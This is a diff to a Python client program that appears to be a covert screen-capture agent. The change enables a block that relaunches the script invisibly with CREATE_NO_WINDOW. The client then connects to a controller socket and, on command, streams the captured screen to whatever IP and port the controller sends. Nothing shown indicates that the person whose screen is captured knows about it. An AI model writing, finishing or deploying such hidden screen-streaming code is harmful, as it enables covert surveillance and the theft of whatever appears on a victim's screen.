@@ -3,6 +3,8 @@ import sys
 import threading
 import pickle
 import socket
+import time
+
 import client_global_flags_a
 import dxcam
 import lz4.frame
@@ -42,33 +44,33 @@ def start_stream(camera_cam, s_socket):
 
 
 # before compiling uncomment these lines
-'''if sys.argv[-1] != 'hidden':
+if sys.argv[-1] != 'hidden':
     subprocess.Popen([sys.executable] + sys.argv + ['hidden'],
                      creationflags=subprocess.CREATE_NO_WINDOW)
 
 
 else:
-    time.sleep(15)'''
+    time.sleep(15)
 
-my_socket = socket.socket()
-my_socket.connect(("127.0.0.1", 44100))
-while True:
-    msg = my_socket.recv(1024).decode()
-    print(msg)
-    if msg == "UP":
-        my_socket.send("UP".encode())
-    if msg == "START_STREAM":
-        # if not client_global_flags.stream_init:
-        ip_port = my_socket.recv(1024).decode()
-        # print(ip_port)
-        ip = ip_port[:ip_port.index(":")]
-        port = int(ip_port[ip_port.index(":") + 1:])
-        init_stream(ip, port)
-        t = threading.Thread(target=start_stream, args=(camera, s,))
-        t.start()
-        client_global_flags_a.streaming = True
-        # else:
-        # client_global_flags.streaming = True
-    if msg == "END_STREAM":
-        client_global_flags_a.streaming = False
-        camera.stop()
+    my_socket = socket.socket()
+    my_socket.connect(("127.0.0.1", 44100))
+    while True:
+        msg = my_socket.recv(1024).decode()
+        print(msg)
+        if msg == "UP":
+            my_socket.send("UP".encode())
+        if msg == "START_STREAM":
+            # if not client_global_flags.stream_init:
+            ip_port = my_socket.recv(1024).decode()
+            # print(ip_port)
+            ip = ip_port[:ip_port.index(":")]
+            port = int(ip_port[ip_port.index(":") + 1:])
+            init_stream(ip, port)
+            t = threading.Thread(target=start_stream, args=(camera, s,))
+            t.start()
+            client_global_flags_a.streaming = True
+            # else:
+            # client_global_flags.streaming = True
+        if msg == "END_STREAM":
+            client_global_flags_a.streaming = False
+            camera.stop()
